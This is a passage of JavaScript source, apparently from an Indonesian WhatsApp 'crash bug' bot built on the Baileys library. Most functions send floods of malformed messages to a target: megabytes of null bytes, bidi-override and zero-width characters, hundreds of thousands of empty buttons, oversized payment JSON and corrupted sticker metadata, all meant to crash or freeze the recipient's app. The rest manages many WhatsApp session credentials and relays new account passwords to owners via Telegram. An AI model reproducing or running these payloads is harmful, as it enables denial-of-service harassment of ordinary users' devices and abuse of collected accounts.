                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        },
        );

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message,
            },
        }, ptcp ?
            {
                messageId: payload.key.id,
                participant: { jid: target }
            } : { messageId: payload.key.id }
        );
        await sleep(1000);
    }

    const message = {
        viewOnceMessage: {
            message: {
                requestPaymentMessage: {
                    body: {
                        text: "#",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "review_and_pay",
                        paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                        version: 3
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, message, {
        groupId: null,
        participant: { jid: target }
    });

    await sock.relayMessage(
        target,
        {
            sendPaymentMessage: {},
            requestPaymentMessage: {},
            imageMessage: {
                url: null
            }
        },
        {
            participant: { jid: target }
        }
    );
}

async function ZnsycLocaMs(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            locationMessage: {
              degreesLatitude: 9999999999,
              degreesLongitude: 9999999999
            },
            body: { text: "XØRA ENGINE ANTI AMPAS" },
            nativeFlowMessage: {
              buttons: "\u0000".repeat(500000)
            },
            contextInfo: { mentionedJid: [target] }
          }
        }
      }
    }, {});
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "\u200B".repeat(50000) + "\u0000".repeat(50000) },
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify(),
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "\u202D".repeat(60000),
                sections: []
              })
            }
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 100));
  }
}

async function RapendoZnsyc(sock, target) {
  const buttonsUI = Array.from({ length: 500 }, () => ({
    buttonId: "\u202E".repeat(5000) + "\u202D".repeat(5000),
    buttonText: {
      displayText: "ြ".repeat(50000) + "ꦽ".repeat(50000) + "\u0000".repeat(30000)
    },
    type: 1
  }));
  
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "†¿! What's Is Truee? ZnSyc7Xarentot" },
        nativeFlowMessage: {
          buttons: "ြ".repeat(200000) + "ꦽ".repeat(200000) + "\u0000".repeat(100000)
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "\u200B".repeat(50000) + "\x10".repeat(50000) + "𑇂".repeat(50000) },
        nativeFlowMessage: {
          buttons: [
            ...buttonsUI,
            {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                display_text: "\u0000".repeat(10000) + "\u200B".repeat(10000),
                id: "\u0000".repeat(5000)
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "\x10".repeat(10000) + "𑇂".repeat(10000),
                url: "https://" + "\u0000".repeat(5000) + ".com"
              })
            },
            {
              name: "booking_confirmation",
              buttonParamsJson: "\u0003".repeat(90000)
            }
          ]
        },
        contextInfo: {
          mentionedJid: [target],
          forwardingScore: 999999999,
          stanzaId: "\u0000".repeat(10000)
        }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 50));
  }
}

async function ZnsycDiamend(sock, target) {
  try {
    for (let i = 0; i < 100; i++) {
      let buttt = [];
      
      for (let j = 0; j < 100; j++) {
        buttt.push({
          name: "booking_confirmation",
          buttonParamsJson: "\u0003".repeat(90000)
        });
      }
      
      await sock.relayMessage(target, {
        interactiveMessage: {
          body: { text: "¿! ZnSyc - Invalidate" },
          nativeFlowMessage: { buttons: buttt },
          contextInfo: { mentionedJid: [target] }
        }
      }, {});
      
      await new Promise(r => setTimeout(r, 100));
    }
    console.log(`Sucesss To ${target}`);
  } catch (error) {
    console.error(` Gagal: ${error.message}`);
  }
}

async function ZnsycOyen(sock, target) {
  for (let i = 0; i < 15; i++) {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "ZnSyC - Ingzin Restu" },
        nativeFlowMessage: {
          buttons: [
            ...Array.from({ length: 300000 }, () => ({})),
            "\u202E".repeat(200000),
            "ြ".repeat(200000) + "ꦽ".repeat(200000) + "\u0000".repeat(100000),
            "ી".repeat(200000),
            "{".repeat(200000),
            "[".repeat(200000)
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "Halo Bang, Kenal ZnSyC?" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "\u202D".repeat(60000),
                sections: []
              })
            },
            {
              name: "booking_status",
              buttonParamsJson: "\u0000".repeat(50000)
            },
            {
              name: "payment_info",
              buttonParamsJson: `{"reference_id":"${"\u0000".repeat(50000)}"}`
            }
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 80));
  }
}

async function ZnsycCeo(sock, target) {
  try {
    console.log(`ᴢɴꜱʏᴄ ꜱᴇᴅᴀɴɢ ᴍᴇʟɪɴᴄɪʀ...`);
    
    for (let i = 0; i < 30; i++) {
      await sock.relayMessage(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "ǝʇıʍɐS - ɔʎSuZ" },
              nativeFlowMessage: {
                buttons: "\u202E".repeat(500000)
              },
              contextInfo: {
                participant: target,
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999999999
              }
            }
          }
        }
      }, {});
      
      await sock.relayMessage(target, {
        viewOnceMessage: {
          message: {
            groupStatusMessageV2: {
              message: {
                interactiveMessage: {
                  body: { text: "ZnSyC - AntiYtimm" },
                  nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                  },
                  contextInfo: {
                    participant: target,
                    mentionedJid: [target],
                    isForwarded: true,
                    forwardingScore: 999999999
                  }
                }
              }
            }
          }
        }
      }, {});
      
      await sock.relayMessage(target, {
        interactiveResponseMessage: {
          body: { text: "\u200B".repeat(500000), format: 1 },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{"title":"RTRwithZnsyc${"\u0000".repeat(500000)}"}`,
            version: 3
          },
          contextInfo: { mentionedJid: [target] }
        }
      }, {});
      
      await new Promise(r => setTimeout(r, 100));
    }
    
    console.log(`ꜱᴜᴋꜱᴇꜱ ʙᴀɴɢɢ ${target} See Yuuuuu`);
  } catch (error) {
    console.error(`Bugs Is Failed: ${error.message}`);
  }
}

async function ZnsycHidupJokowil(sock, targetJid) {
  const msg1 = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363424946687543@newsletter",
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(60000) + "\u0000".repeat(50000),
          caption: "¿? Znsyc7Romance\n" + "𑇂𑆵𑆴𑆿".repeat(60000) + "\u202D".repeat(30000),
          inviteExpiration: "999999999999999",
          jpegThumbnail: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0xFF, 0xC0, 0x00, 0x11, 0x08, 0xFF, 0xFF, 0xFF, 0xFF])
        }
      }
    }
  };

  const msg2 = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };

  const msg3 = {
    interactiveMessage: {
      body: { text: "\u0000".repeat(80000) + "ြ".repeat(50000) },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify(),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\u202D".repeat(60000),
              sections: []
            })
          }
        ]
      },
      contextInfo: { mentionedJid: [targetJid] }
    }
  };

  const msg4 = {
    interactiveMessage: {
      body: { text: "\u200B".repeat(50000) },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      },
      contextInfo: { mentionedJid: [targetJid] }
    }
  };

  for (let i = 0; i < 5; i++) {
    await sock.relayMessage(targetJid, msg1, {});
    await sock.relayMessage(targetJid, msg2, {});
    await sock.relayMessage(targetJid, msg3, {});
    await sock.relayMessage(targetJid, msg4, {});
    await new Promise(r => setTimeout(r, 100));
  }
}

async function PenetrationZnsyc(sock, target) {
  const stickers = {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
      fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: Buffer.alloc(32, '').toString('base64'),
      mimetype: "image/webp",
      height: -1,
      width: 5000,
      directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
      fileLength: null,
      mediaKeyTimestamp: 1710000000,
      firstFrameLength: 999,
      firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      isAnimated: true,
      pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      contextInfo: {
        mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
        interactiveAnnotations: [{
          polygonVertices: [{ x: 0.1, y: 0.1 }, { x: 0.9, y: 0.1 }, { x: 0.9, y: 0.9 }, { x: 0.1, y: 0.9 }],
          location: { latitude: -6.2088, longitude: 106.8456, name: "¿! ZnSyc - Suka Juleh" }
        }]
      },
      stickerSentTs: 1710000000,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "\u0000".repeat(9000),
      mediaKeyDomain: null
    }
  };

  for (let n = 0; n < 1000; n++) {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "!¿ Znsyc - Stecuh " },
        nativeFlowMessage: {
          buttons: [
            {
              name: (["inapp_signup", "booking_status", "galaxy_message"][(n + (Math.random() < 0.5 ? 1 : 0)) % 3]),
              buttonParamsJson: "\u0000".repeat(1000000)
            }
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await sock.relayMessage(target, stickers, {});
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [{
            name: "payment_info",
            buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
          }]
        }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 10));
  }
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
            
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
    
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function sendAccountCreatedNotification({ username, password, role, createdBy, createdAt }) {
  const config = loadTelegramConfig();
  const ownerList = Array.isArray(config.ownerList) ? config.ownerList : [];
  if (!ownerList.length) return;

  const text = `🎉 *Akun baru berhasil di buat*

` +
    `👤 Username: ${username}
` +
    `🔑 Password: ${password}
` +
    `🎯 Role: ${role}
` +
    `👤 Di buat oleh: ${createdBy}
` +
    `⏰ Waktu buat akun: ${createdAt}`;

  ownerList.forEach((ownerId) => {
    bot.sendMessage(ownerId, text, { parse_mode: 'Markdown' }).catch(err => {
      console.error('[❌ TELEGRAM NOTIF] Gagal kirim notifikasi akun baru ke', ownerId, err.message);
    });
  });
}

function sendTelegramOwners(text, options = {}) {
  const config = loadTelegramConfig();
  const ownerList = Array.isArray(config.ownerList) ? config.ownerList : [];
  if (!ownerList.length) return;

  ownerList.forEach((ownerId) => {
    bot.sendMessage(ownerId, text, { parse_mode: 'Markdown', ...options }).catch(err => {
      console.error('[❌ TELEGRAM NOTIF] Gagal kirim pesan ke owner', ownerId, err.message);
    });
  });
}

async function sendDatabaseToOwners() {
  const config = loadTelegramConfig();
  const ownerList = Array.isArray(config.ownerList) ? config.ownerList : [];
  if (!ownerList.length) return;

  if (!fs.existsSync(dbPath)) {
    console.error('[DB BACKUP] database.json tidak ditemukan, gagal kirim ke owner.');
    return;
  }

  for (const ownerId of ownerList) {
    try {
      const fileStream = fs.createReadStream(dbPath);
      await bot.sendDocument(ownerId, fileStream, {
